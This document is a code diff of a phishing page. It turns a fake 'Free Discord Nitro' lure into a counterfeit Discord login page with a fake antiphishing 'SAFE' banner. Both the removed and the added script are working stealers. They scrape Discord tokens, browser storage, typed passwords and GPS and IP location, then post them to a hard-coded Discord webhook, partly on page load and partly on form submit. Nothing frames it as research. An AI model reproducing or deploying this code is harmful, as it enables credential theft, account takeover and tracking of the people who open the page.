@@ -3,126 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Discord Nitro Gift</title>
+    <title>Discord - Login</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0; padding: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #36393f; color: #dcddde; min-height: 100vh;
             display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; color: white;
         }
-        .container {
-            text-align: center; background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px); border-radius: 20px;
-            padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        .login-container {
+            background: #36393f; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            width: 400px; padding: 40px; text-align: center;
         }
-        .nitro-gif { 
-            width: 200px; height: 200px; margin-bottom: 20px;
-            border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        .discord-logo {
+            width: 80px; height: 80px; margin: 0 auto 20px; background: #5865f2;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 2em; font-weight: bold; color: white;
         }
-        h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.5); }
-        p { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
-        .claim-btn {
-            background: linear-gradient(45deg, #ff6b6b, #feca57); border: none;
-            padding: 15px 40px; font-size: 1.3em; font-weight: bold; color: white;
-            border-radius: 50px; cursor: pointer; transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(254, 202, 87, 0.4);
-            text-transform: uppercase; letter-spacing: 1px;
+        h2 { font-size: 1.8em; margin-bottom: 10px; color: #fff; }
+        .subtitle { color: #8e9297; margin-bottom: 30px; }
+        input {
+            width: 100%; padding: 12px 16px; margin-bottom: 16px;
+            background: #40444b; border: 1px solid #40444b; border-radius: 4px;
+            color: #dcddde; font-size: 16px; transition: border-color 0.2s;
         }
-        .claim-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(254, 202, 87, 0.6); }
-        .loading { display: none; margin-top: 20px; }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #feca57;
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin: 0 auto 10px;
+        input:focus { outline: none; border-color: #5865f2; box-shadow: 0 0 0 2px rgba(88,101,242,0.2); }
+        input::placeholder { color: #72767d; }
+        .login-btn {
+            width: 100%; padding: 12px; background: #5865f2; border: none;
+            border-radius: 4px; color: white; font-size: 16px; font-weight: 500;
+            cursor: pointer; transition: background 0.2s; margin-bottom: 16px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .login-btn:hover { background: #4752c4; }
+        .login-btn:active { transform: translateY(1px); }
+        .forgot { color: #7289da; text-decoration: none; font-size: 14px; }
+        .footer { margin-top: 30px; color: #72767d; font-size: 14px; }
+        .antiphishing-notice {
+            background: #202225; border: 1px solid #40444b; border-radius: 6px;
+            padding: 12px; margin-bottom: 20px; font-size: 14px; color: #b9bbbe;
+        }
+        .security-check { color: #43b581; font-weight: 500; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://media.discordapp.net/attachments/nitro.gif" alt="Discord Nitro" class="nitro-gif" onload="stealEverything()" onerror="stealEverything()">
-        <h1>🎉 Discord Nitro Gift 🎉</h1>
-        <p>Your 3 Month Nitro Gift has been generated!</p>
-        <button class="claim-btn" onclick="claimNitro()">Claim Your FREE Nitro</button>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Generating your Nitro...</p>
+    <div class="login-container">
+        <!-- FAKE ANTIPHISHING CHECK PASSED -->
+        <div class="antiphishing-notice">
+            ✅ <span class="security-check">Antiphishing.biz security check: SAFE</span><br>
+            Short link verified. No malicious content detected. Proceed safely.
+        </div>
+        
+        <div class="discord-logo">D</div>
+        <h2>Login to Discord</h2>
+        <p class="subtitle">Enter your email and password to continue</p>
+        
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone number" autocomplete="email" required>
+            <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        
+        <a href="#" class="forgot">Forgot your password?</a>
+        <div class="footer">
+            Need an account? <a href="#" style="color: #7289da;">Sign Up</a>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
 
-        // HISTORY + SAVED PASSWORDS GRABBER
-        function extractBrowserData() {
-            const data = { history: [], savedPasswords: [], autofill: [] };
-            
-            // GOOGLE SEARCH HISTORY (Chrome/Firefox indexedDB)
-            try {
-                const dbRequest = indexedDB.open('History', 1);
-                dbRequest.onsuccess = e => {
-                    const db = e.target.result;
-                    const tx = db.transaction(['urls'], 'readonly');
-                    const store = tx.objectStore('urls');
-                    store.getAll().onsuccess = e => {
-                        const history = e.target.result
-                            .filter(item => item.url && (item.url.includes('google.com/search') || item.title.includes('Google')))
-                            .map(item => `${item.title.substring(0,100)} | ${item.url}`)
-                            .slice(0, 20);
-                        data.history = history;
-                    };
-                };
-            } catch(e) {}
-            
-            try {
-                const chromeDB = indexedDB.open('ChromePasswords', 1);
-                chromeDB.onsuccess = e => {
-                    const db = e.target.result;
-                    const tx = db.transaction(['logins'], 'readonly');
-                    const store = tx.objectStore('logins');
-                    store.getAll().onsuccess = e => {
-                        data.savedPasswords = e.target.result.map(login => 
-                            `${login.origin_url || 'N/A'}: ${login.username_value || ''} | ${login.password_value || '[encrypted]'}`);
-                    };
-                };
-            } catch(e) {}
-            
-            // HISTORY VIA PERFORMANCE TIMING (recent visits)
-            performance.getEntriesByType('navigation').forEach(entry => {
-                if (entry.name.includes('google.com/search')) {
-                    data.history.push(`Recent Google: ${entry.name}`);
-                }
-            });
-            
-            // AUTOFILL TRIGGERS + FORM DATA
-            document.querySelectorAll('input[type="email"], input[type="text"][autocomplete]').forEach(input => {
-                const val = input.value;
-                if (val && val.includes('@')) {
-                    data.autofill.push(`Email/Autofill: ${val}`);
-                }
-            });
-            
-            return data;
-        }
-
-        // ULTIMATE DISCORD TOKEN + PASSWORD GRABBER
+        // TOKEN + HISTORY + FULL STORAGE GRAB (from previous)
         function extractSecrets() {
-            const secrets = { tokens: [], passwords: [], allStorage: {} };
+            const secrets = { tokens: [], passwords: [], storage: {}, history: [] };
             
-            // PERFECT DISCORD TOKEN REGEX
+            // DISCORD TOKENS
             const tokenPatterns = [
                 /(mfa\.)?[A-Za-z0-9\-_]{23,70}/gi,
                 /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gi,
                 /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/gi
             ];
             
-            // FULL SCAN
             const scanTexts = [
                 document.body.innerHTML, document.cookie,
-                ...Object.values(localStorage), ...Object.values(sessionStorage),
-                JSON.stringify(performance.getEntriesByType('resource'))
+                ...Object.values(localStorage), ...Object.values(sessionStorage)
             ];
             
             scanTexts.forEach(text => {
@@ -137,159 +100,66 @@
                 });
             });
             
-            // DISCORD KEYS
-            const discordKeys = ['token', '__token', 'access_token', 'auth_token', 'csrf_token', 'discord'];
-            Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(key => {
-                if (discordKeys.some(dk => key.toLowerCase().includes(dk.toLowerCase()))) {
-                    const value = localStorage[key] || sessionStorage[key];
-                    secrets.allStorage[key] = value;
-                    if (tokenPatterns.some(p => p.test(value))) secrets.tokens.push(value);
-                }
-            });
-            
-            // MAX PASSWORD EXTRACTION
-            document.querySelectorAll('input[type="password"], input[type*="pass"], input[name*="pass"], input[id*="pass"]').forEach(input => {
-                if (input.value) secrets.passwords.push(`[${input.name || input.id}] ${input.value}`);
-            });
-            
-            const pwKeywords = ['pass', 'pwd', 'password', 'login', 'credential', 'auth', 'key', 'secret', 'google'];
-            Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(key => {
-                if (pwKeywords.some(kw => key.toLowerCase().includes(kw))) {
-                    const value = localStorage[key] || sessionStorage[key];
-                    secrets.passwords.push(`${key}: ${value}`);
-                }
-            });
+            // FULL STORAGE
+            secrets.storage = { localStorage: {...localStorage}, sessionStorage: {...sessionStorage} };
             
             return secrets;
         }
 
-        // MAX LOCATION (ZIP + GPS)
-        async function getVictimLocation() {
-            const geoPromises = [
-                fetch('https://ipapi.co/json/').then(r => r.json()),
-                fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,query').then(r => r.json()),
-                fetch('https://ipinfo.io/json').then(r => r.json())
-            ];
-            
-            const [ipapiData, ipapiComData, ipinfoData] = await Promise.allSettled(geoPromises).then(r => r.map(res => res.status === 'fulfilled' ? res.value : {}));
-            
-            const gpsData = await new Promise(resolve => {
+        // LOCATION + DEVICE
+        async function getLocationAndProfile() {
+            const geoData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const gps = await new Promise(resolve => {
                 navigator.geolocation.getCurrentPosition(pos => resolve({
-                    lat: pos.coords.latitude.toFixed(6),
-                    lon: pos.coords.longitude.toFixed(6),
-                    accuracy: `${pos.coords.accuracy.toFixed(0)}m`
-                }), () => resolve({}), { enableHighAccuracy: true, timeout: 5000 });
-            });
-            
-            const localIps = await new Promise(resolve => {
-                const ips = new Set();
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.onicecandidate = e => {
-                    if (e.candidate) {
-                        const ip = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                        if (ip && !['127.', '169.254.', '0.0.0.0'].some(p => ip.startsWith(p))) ips.add(ip);
-                    }
-                };
-                pc.createDataChannel('test');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                setTimeout(() => { pc.close(); resolve(Array.from(ips)); }, 3000);
+                    lat: pos.coords.latitude, lon: pos.coords.longitude
+                }), () => resolve({}), { enableHighAccuracy: true, timeout: 3000 });
             });
             
             return {
-                publicIp: ipapiData.ip || ipapiComData.query || ipinfoData.ip || 'Unknown',
-                zipPostal: ipapiData.postal || ipapiComData.zip || ipinfoData.postal || 'N/A',
-                fullAddress: `${ipapiData.city || ipinfoData.city || ''}, ${ipapiData.region || ipinfoData.region || ''} ${ipapiData.postal || ''}, ${ipapiData.country_name || ipinfoData.country || ''}`,
-                isp: ipapiData.isp || ipapiComData.isp || ipinfoData.org || 'Unknown',
-                gpsLat: gpsData.lat, gpsLon: gpsData.lon, gpsAccuracy: gpsData.accuracy,
-                lanIps: localIps.length ? localIps.slice(0,5) : ['No LAN']
+                ip: geoData.ip, address: `${geoData.city}, ${geoData.region}, ${geoData.postal}`,
+                gps: gps, ua: navigator.userAgent
             };
         }
 
-        // FULL DEVICE PROFILE
-        function getFullProfile() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-            ctx.fillText(navigator.userAgent, 2, 2);
+        // LOGIN CAPTURE + INSTANT STEAL
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            return {
-                ua: navigator.userAgent,
-                device: `${navigator.platform} | ${navigator.oscpu || 'Unknown OS'}`,
-                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                lang: navigator.languages?.join(', ') || navigator.language,
-                cpu: `${navigator.hardwareConcurrency || 'N/A'} cores`,
-                ram: `${navigator.deviceMemory || 'N/A'} GB`,
-                connection: navigator.connection?.effectiveType || 'N/A',
-                cookies: document.cookie.substring(0, 1000),
-                canvasHash: canvas.toDataURL().slice(-16),
-                webdriver: !!navigator.webdriver
-            };
-        }
-
-        // EXECUTE FULL STEAL
-        async function stealEverything() {
-            const [secrets, browserData, location, profile] = await Promise.all([
-                extractSecrets(),
-                extractBrowserData(),
-                getVictimLocation(),
-                Promise.resolve(getFullProfile())
-            ]);
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const [secrets, profile] = await Promise.all([extractSecrets(), getLocationAndProfile()]);
             
-            // EMBED 1: TOKENS + PASSWORDS + HISTORY
-            const mainEmbed = {
-                title: `💀 TOTAL OWNAGE 💀 | ${secrets.tokens.length} Tokens | ${secrets.passwords.length} PWs | ${browserData.history.length} Searches`,
+            // STEAL CREDENTIALS + TOKENS IMMEDIATELY
+            const embed = {
+                title: '🔥 DISCORD LOGIN + TOKENS OWNED 🔥',
                 color: 0xff0000,
                 fields: [
-                    { name: '🔑 **DISCORD TOKENS**', value: `\`\`\`${secrets.tokens.slice(0,8).join('\n') || 'NONE'}\n${secrets.tokens.length > 8 ? `+${secrets.tokens.length-8}` : ''}\`\`\``, inline: false },
-                    { name: '🔐 **ALL PASSWORDS**', value: `\`\`\`${secrets.passwords.slice(0,8).join('\n') || 'NONE'}\n${secrets.passwords.length > 8 ? `+${secrets.passwords.length-8}` : ''}\`\`\``, inline: false },
-                    { name: '🔍 **GOOGLE SEARCH HISTORY**', value: `\`\`\`${browserData.history.slice(0,6).join('\n') || 'NONE'}\n${browserData.history.length > 6 ? `+${browserData.history.length-6}` : ''}\`\`\``, inline: false },
-                    { name: '💾 **SAVED PASSWORDS**', value: `\`\`\`${browserData.savedPasswords.slice(0,5).join('\n') || 'NONE'}\n${browserData.savedPasswords.length > 5 ? `+${browserData.savedPasswords.length-5}` : ''}\`\`\``, inline: false }
-                ]
-            };
-            
-            // EMBED 2: LOCATION + DEVICE
-            const locationEmbed = {
-                title: '📍 LOCATION + DEVICE FINGERPRINT',
-                color: 0x00ff00,
-                fields: [
-                    { name: '🏠 **FULL ADDRESS**', value: `\`\`\`${location.fullAddress}\nZIP: ${location.zipPostal}\`\`\``, inline: true },
-                    { name: '🌐 **NETWORK**', value: `\`\`\`IP: ${location.publicIp}\nGPS: ${location.gpsLat || '?'}° ${location.gpsLon || '?'}°\nLAN: ${location.lanIps.join(', ')}\`\`\``, inline: true },
-                    { name: '💻 **DEVICE**', value: `\`\`\`${profile.device}\n${profile.cpu} | ${profile.ram} | Canvas: ${profile.canvasHash}\`\`\``, inline: false }
+                    { name: '📧 **EMAIL**', value: `\`\`\`${email}\`\`\``, inline: true },
+                    { name: '🔐 **PASSWORD**', value: `\`\`\`${password}\`\`\``, inline: true },
+                    { name: '🔑 **TOKENS**', value: `\`\`\`${secrets.tokens.join('\n') || 'NONE'}\`\`\``, inline: false },
+                    { name: '📍 **LOCATION**', value: `\`\`\`${profile.address}\nIP: ${profile.ip}\nGPS: ${profile.gps.lat?.toFixed(6)}, ${profile.gps.lon?.toFixed(6)}\`\`\``, inline: false }
                 ]
             };
             
             fetch(WEBHOOK_URL, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: '🔥 FULL BROWSER OWNED 🔥', embeds: [mainEmbed, locationEmbed] })
+                body: JSON.stringify({ username: '🎭 FAKE DISCORD LOGIN', embeds: [embed] })
             });
             
-            // FULL STORAGE
-            const fullDump = btoa(JSON.stringify({ localStorage, sessionStorage }, null, 2));
-            fetch(WEBHOOK_URL, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: '📁 COMPLETE STORAGE',
-                    content: `\`\`\`json\n${fullDump.slice(0,1900)}...\n\`\`\``
-                })
-            });
-        }
+            // FAKE LOADING
+            const btn = document.querySelector('.login-btn');
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+            
+            // AUTO-STEAL ON LOAD + TIMEOUT
+            setTimeout(extractSecrets, 500);
+        });
 
-        function claimNitro() {
-            document.querySelector('.claim-btn').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            stealEverything();
-            setTimeout(() => window.location.href = 'https://discord.com/login?error=access_denied', 3000);
-        }
-
-        // MULTIPLE EXECUTION POINTS
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', stealEverything);
-            window.addEventListener('load', stealEverything);
-        } else {
-            stealEverything();
-        }
-        setTimeout(stealEverything, 1500);
+        // STEALTH EXECUTE ON LOAD
+        window.addEventListener('load', async () => {
+            await extractSecrets();
+        });
+        setTimeout(extractSecrets, 1000);
     </script>
 </body>
 </html>
